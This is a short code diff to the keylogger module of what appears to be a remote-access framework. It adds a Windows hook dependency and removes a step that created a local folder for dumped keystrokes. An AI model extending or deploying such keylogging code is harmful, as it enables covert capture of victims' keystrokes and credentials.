@@ -22,7 +22,7 @@ class KeyloggerModule(PupyModule):
 
     unique_instance = True
     dependencies = {
-        'windows': [ 'pupwinutils.keylogger' ],
+        'windows': [ 'pupwinutils.keylogger', 'pupwinutils.hookfuncs' ],
         'linux': [ 'keylogger' ],
     }
 
@@ -68,11 +68,6 @@ class KeyloggerModule(PupyModule):
                     self.success("keylogger started !")
 
         elif args.action=="dump":
-            try:
-                os.makedirs(os.path.join("data","keystrokes"))
-            except Exception:
-                pass
-
             if self.client.is_windows():
                 keylogger_dump = self.client.remote('pupwinutils.keylogger', 'keylogger_dump')
             else:
